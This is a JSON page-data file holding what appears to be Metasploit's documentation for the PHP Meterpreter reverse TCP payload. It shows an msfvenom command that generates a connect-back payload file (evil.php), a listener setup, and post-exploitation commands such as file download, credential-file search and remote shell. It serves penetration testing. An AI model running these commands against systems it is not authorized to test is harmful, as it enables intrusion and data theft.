{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/payload/php/meterpreter/reverse_tcp","result":{"data":{"moduleMetadataJson":{"id":"5f04544e-019a-56e8-a986-a2ddfe1516e4","name":"PHP Meterpreter, PHP Reverse TCP Stager","fullname":"payload/php/meterpreter/reverse_tcp","description":"Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions","rank":300,"fields":{"detailsSlug":"/modules/details/payload/php/meterpreter/reverse_tcp","documentationSlug":"/modules/documentation/payload/php/meterpreter/reverse_tcp","referencesSlug":"/modules/references/payload/php/meterpreter/reverse_tcp"},"documentation":{"html":"<p>The php/meterpreter/reverse<em>tcp is a staged payload used to gain meterpreter access to a compromised system. This is a unique payload in the Metasploit Framework because this payload is one of the only payloads that are used in RFI vulnerabilities in web apps. This module _can</em> be cross platform, but the target needs to be able to run php code.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  The PHP Meterpreter is suitable for any system that supports PHP. For example, the module can be used against webservers which run PHP code for a website. OS X has PHP installed by default.</p>\n<h2 id=\"deploying-phpmeterpreterreverse_tcp\" style=\"position:relative;\"><a href=\"#deploying-phpmeterpreterreverse_tcp\" aria-label=\"deploying phpmeterpreterreverse_tcp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Deploying php/meterpreter/reverse_tcp</h2>\n<h3 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h3>\n<p>  Specific demo of using the module that might be useful in a real world scenario.</p>\n<h4 id=\"generating-a-file-with-msfvenom\" style=\"position:relative;\"><a href=\"#generating-a-file-with-msfvenom\" aria-label=\"generating a file with msfvenom permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Generating a file with msfvenom</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o evil.php</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h4 id=\"starting-a-listener\" style=\"position:relative;\"><a href=\"#starting-a-listener\" aria-label=\"starting a listener permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Starting a listener</h4>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use multi/handler\nmsf exploit(handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp\nPAYLOAD =&gt; php/meterpreter/reverse_tcp\nmsf exploit(handler) &gt; set LHOST [IP]\nLHOST =&gt; [IP]\nmsf exploit(handler) &gt; set LPORT 4444\nLPORT =&gt; 4444\nmsf exploit(handler) &gt; exploit\n\n[*] Started reverse TCP handler on [IP]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"important-basic-commands\" style=\"position:relative;\"><a href=\"#important-basic-commands\" aria-label=\"important basic commands permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Important Basic Commands</h2>\n<p>Compared to a native Meterpreter such as windows/meterpreter/reverse_tcp, the PHP Meterpreter\nhas less commands, but here's a list of all the common ones you might need:</p>\n<p><strong>pwd command</strong></p>\n<p>The <code class=\"language-text\">pwd</code> command tells you the current working directory. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; pwd\n/Users/thecarterb/Desktop</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>cd command</strong></p>\n<p>The <code class=\"language-text\">cd</code> command allows you to change directories. Example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cd /Users/thecarterb/Desktop\nmeterpreter &gt; pwd\n/Users/thecarterb/Desktop</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>cat command</strong></p>\n<p>The <code class=\"language-text\">cat</code> command allows you to see the content of a file:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; cat /tmp/data.txt\nHello World!</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>upload command</strong></p>\n<p>The <code class=\"language-text\">upload</code> command allows you to upload a file to the remote target. This is useful for uploading additional payload files. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; upload /tmp/data.txt /Users/thecarterb/Desktop\n[*] uploading  : /tmp/data.txt -&gt; /Users/thecarterb/Desktop\n[*] uploaded   : /tmp/data.txt -&gt; /Users/thecarterb/Desktop/data.txt\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>download command</strong></p>\n<p>The <code class=\"language-text\">download</code> command allows you to download a file from the remote target to your machine.\nFor example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; download /Users/thecarterb/Desktop/data.txt /tmp/pass.txt\n[*] downloading: /Users/thecarterb/Desktop/data.txt -&gt; /tmp/pass.txt/data.txt\n[*] download   : /Users/thecarterb/Desktop/data.txt -&gt; /tmp/pass.txt/data.txt\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>search command</strong></p>\n<p>The <code class=\"language-text\">search</code> command allows you to find files on the remote file system. For example,\nthis shows how to find all text files in the current directory:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; search -d . -f *.txt\nFound 2 results...\n    .\\pass.txt (13 bytes)\n    ./creds\\data.txt (83 bytes)\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Without the <code class=\"language-text\">-d</code> option, the command will attempt to search in all drives.</p>\n<p>The <code class=\"language-text\">-r</code> option for the command allows you to search recursively.</p>\n<p><strong>getuid command</strong></p>\n<p>The <code class=\"language-text\">getuid</code> command tells you the current user that Meterpreter is running on. For example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; getuid\nServer username: root</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>execute command</strong></p>\n<p>The <code class=\"language-text\">execute</code> command allows you to execute a command or file on the remote machine.</p>\n<p>The following examples uses the command to create a text file:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; execute -f echo -a &quot;hello &gt; /tmp/hello.txt&quot;\nProcess 73642 created.\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p><strong>ps command</strong></p>\n<p>The <code class=\"language-text\">ps</code> command lists the running processes on the remote machine.</p>\n<p><strong>shell command</strong></p>\n<p>The <code class=\"language-text\">shell</code> command allows you to interact with the remote machine's command prompt (or shell).\nFor example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; shell\nProcess 74513 created.\nChannel 2 created.\nsh-3.2#</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel.</p>\n<p><strong>sysinfo</strong></p>\n<p>The <code class=\"language-text\">sysinfo</code> command shows you basic information about the remote machine. Such as:</p>\n<ul>\n<li>Computer name</li>\n<li>OS name</li>\n<li>Architecture</li>\n<li>Meterpreter type</li>\n</ul>\n<h2 id=\"using-post-modules\" style=\"position:relative;\"><a href=\"#using-post-modules\" aria-label=\"using post modules permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using <code class=\"language-text\">post</code> modules</h2>\n<p>When using the PHP Meterpreter, you have the feature of using Metasploit's <code class=\"language-text\">post</code> modules on that specific session. By default, most <code class=\"language-text\">multi</code> post modules will work; however, you can also use OS specific modules depending on the OS of the compromised system. For example, if you have a PHP Meterpreter session running on OS X, you can use <code class=\"language-text\">osx</code> post modules on that session. </p>\n<p>  <strong>Don't forget to:</strong></p>\n<ul>\n<li>Set the <code class=\"language-text\">LHOST</code> datastore option to the connect-back IP Address</li>\n<li>If you want to get multiple shells, set <code class=\"language-text\">ExitOnSession</code> to <code class=\"language-text\">false</code></li>\n</ul>"}}},"pageContext":{"id":"5f04544e-019a-56e8-a986-a2ddfe1516e4"}}}